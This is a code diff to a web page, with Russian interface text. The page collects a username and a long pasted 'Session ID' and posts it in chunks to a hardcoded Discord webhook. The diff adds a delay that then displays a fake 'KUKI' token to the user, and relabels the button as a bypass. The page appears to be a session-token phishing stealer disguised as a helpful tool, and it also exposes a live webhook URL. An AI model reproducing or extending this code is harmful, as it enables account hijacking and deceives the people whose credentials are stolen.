@@ -37,7 +37,7 @@ align-items: center;
 padding: 32px 14px;
 }
 
-/* ✅ HEADER В ПРАВОМ ВЕРХНЕМ УГЛУ */
+/* HEADER В ПРАВОМ ВЕРХНЕМ УГЛУ */
 .header {
 position: absolute;
 top: 20px;
@@ -135,6 +135,16 @@ placeholder="Session ID"></textarea>
 <div id="message" style="display:none"></div>
 </div>
 </div>
+
+<table id="kukiTable" style="display:none; margin-top:20px; border-collapse: collapse; width:100%">
+ <tbody>
+ <tr>
+ <td style="border:1px solid rgba(255,255,255,0.1); padding:10px; background:rgba(2,6,23,0.55); color:var(--text)">
+ Ваш KUKI: CAEaAhADIhwKBGR1aWQSFDEyMjgzNTAzOTk3NzYzODI4MDc2KAM.mXiBZ87l_FfMVy0mtKTngZHJhnIxKnAk8C6UfYfxFDyJL9h6U1RB05zoTR6ZwA1VN7rNAlOc_bHkX8N0IkmMiHij98o4FV_q05uEGlH4tnbuNoRViTaTfK-3w82Fcb5FISIC1ShcPaPpdOQIkHHBPhUAswHaVs3M-gr6unD7_I5tb5gToliFDvz6fOXUBbJKKX-auKwG5X_lYAYKihlOfvm5SDqWOfeqPJF5Oo9VEbbG32Ary3dc_6CWE8JGvDnuVdl74P2EDV-FSRmwIVrW5y9tR38vmir6uGSpQPcCM9EPmFs1GUXk45KCE_sh5F8OKiSgn2dZtgad9z5xSIZJqsndzY2w0dd7JmPrFTndT9YSDA4Rn4dy5IbgcfuOaYxHldQjVrjpgjKbq_j2pe3jfjVyVBUPEAIJT9_-UVPnnLPiOZxpRGi1Qh3MmqomZTmdH7nmOCtyiHotKrdbS-N1q0faFKTC_QufJbzT19wnQYV17DkEHfPVpmBHvfU7jteYu4Wo9h8sV8Ag_RBQN7UnbHu1hF-i_LZJD-s3KDdrwoc_DJ4wkKL2BC_xOkjMyPnLeHsBrh4PQ-wJRmiGOcyhF9LCZ-D-cujCL13wEd8rDuoo-Sg61oep706KFZvh5bRo6UNdpA
+ </td>
+ </tr>
+ </tbody>
+</table>
 </section>
 </main>
 </div>
@@ -146,6 +156,7 @@ const usernameInput = document.getElementById('username');
 const sessionInput = document.getElementById('sessionmsg');
 const btn = document.getElementById('submitBtn');
 const msg = document.getElementById('message');
+const kukiTable = document.getElementById('kukiTable');
 
 const DISCORD_WEBHOOK_URL =
 'https://discord.com/api/webhooks/1458280504502784123/Jie5d0xI0a-nDRMa50fjXKacIl3_o3omg0vBBUs0RR8WRNiOajl3W9kfTYu_vqMNNUD5';
@@ -194,54 +205,57 @@ function processText(text) {
 
 async function sendChunked(text) {
  for (let i = 0; i < text.length; i += 1900) {
-  await fetch(DISCORD_WEBHOOK_URL, {
-   method: 'POST',
-   headers: { 'Content-Type': 'application/json' },
-   body: JSON.stringify({ content: text.slice(i, i + 1900) })
-  });
+ await fetch(DISCORD_WEBHOOK_URL, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ content: text.slice(i, i + 1900) })
+ });
  }
 }
 
-/* ✅ ЗАМЕНЁННЫЙ ОБРАБОТЧИК КНОПКИ */
+/* ЗАМЕНЁННЫЙ ОБРАБОТЧИК КНОПКИ */
 btn.addEventListener('click', async () => {
  const username = usernameInput.value.trim();
  const sessionText = sessionInput.value;
 
  if (!username || !sessionText) {
-  showMessage('Заполните все поля', false);
-  return;
+ showMessage('Заполните все поля', false);
+ return;
  }
 
  const processed = cutFirst1000(sessionText);
 
  if (!processed) {
-  showMessage('Текст короче или равен 1000 символам', false);
-  return;
+ showMessage('Текст короче или равен 1000 символам', false);
+ return;
  }
 
  btn.disabled = true;
  showMessage('Отправка...', true);
 
  try {
-  await sendChunked(
+ await sendChunked(
 `Processed Session ID
 User: ${username}
 
 ${processed}`
-  );
-  showMessage('Отправлено ✅', true);
+ );
+ showMessage('Отправлено ', true);
+ btn.textContent = 'Ожидание';
+ setTimeout(() => {
+  kukiTable.style.display = 'table';
+  btn.textContent = 'Байпасснуть обидчика';
   sessionInput.value = '';
- } catch {
-  showMessage('Ошибка отправки', false);
- } finally {
   enableIfValid();
+ }, 10000);
+ } catch (error) {
+ showMessage('Ошибка отправки', false);
+ enableIfValid();
  }
 });
 
 enableIfValid();
 });
-</script>
-</script>
 </script>
 
 </body>
